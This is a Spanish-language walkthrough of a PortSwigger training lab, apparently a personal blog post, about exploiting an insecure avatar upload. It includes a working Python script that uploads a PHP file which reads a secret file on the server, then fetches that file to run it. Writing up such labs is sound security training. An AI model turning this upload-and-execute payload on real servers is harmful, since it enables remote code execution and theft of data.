Este lab de PortSwigger presenta una vulnerabilidad en un sistema que permite la subida de imágenes sin validar correctamente los archivos, lo que lleva a una ejecución remota de código (RCE). El objetivo es subir un archivo PHP malicioso y utilizarlo para obtener el contenido del archivo secreto /home/carlos/secret.
Herramientas utilizadas:
En lugar de usar Burp Suite, decidí utilizar Python y la librería requests para realizar el ataque, ya que me permite entender mejor el flujo de las solicitudes HTTP y la automatización de tareas de ciberseguridad.
Pasos seguidos:
Autenticación: Utilicé un token CSRF para iniciar sesión en el sistema. Esto es fundamental ya que muchos sitios web modernos implementan esta protección para prevenir ataques CSRF.
Subida del archivo PHP: Se subió un archivo PHP malicioso mediante una solicitud POST, manipulando el campo de carga para incluir un script que leería el archivo secreto en el sistema vulnerable.
Ejecución remota de código: Después de subir el archivo, realicé una solicitud GET para ejecutar el archivo PHP y extraer el contenido secreto.
Obtención del secreto: Finalmente, el contenido del archivo secreto fue extraído utilizando el script PHP y se resolvió el lab con éxito.
Problemas encontrados:
Token CSRF: La primera barrera fue manejar correctamente los tokens CSRF que se requerían para realizar las solicitudes.
Parámetros adicionales: El servidor también exigía parámetros como user e id, que inicialmente pasaron desapercibidos.

import requests
from bs4 import BeautifulSoup

# Definir la URL base y crear una sesión
LAB_URL = "https://example.com"
SESSION = requests.Session()

# Obtener token CSRF
def get_csrf_token(url):
    page = SESSION.get(url)
    soup = BeautifulSoup(page.text, "html.parser")
    csrf_token = soup.find("input", {"name": "csrf"})["value"]
    return csrf_token

# Subir archivo PHP
def upload_file():
    csrf_token = get_csrf_token(f"{LAB_URL}/my-account?id=wiener")
    files = {"avatar": ("exploit.php", "<?php echo file_get_contents('/home/carlos/secret'); ?>")}
    data = {"csrf": csrf_token, "user": "wiener", "id": "wiener"}
    response = SESSION.post(f"{LAB_URL}/my-account/avatar?id=wiener", files=files, data=data)
    return response

# Ejecutar el archivo PHP y obtener el secreto
def get_secret():
    secret_response = SESSION.get(f"{LAB_URL}/files/avatars/exploit.php")
    return secret_response.text.strip()


Reflexión:
Utilizar Python para este tipo de pruebas de penetración me dio un control mucho mayor sobre cada paso del proceso, desde la autenticación hasta la obtención del secreto.
Me resultó interesante experimentar con el manejo de CSRF y cómo esto afecta a la ejecución de acciones en aplicaciones web.
Conclusión:
El uso de Python en lugar de Burp Suite me permitió una mayor flexibilidad y comprensión técnica del proceso. Este tipo de retos son fundamentales para avanzar en el camino de la ciberseguridad.

# Resolver el lab
response = upload_file()
if "has been uploaded" in response.text:
    secret = get_secret()
    print(f"Secreto obtenido: {secret}")
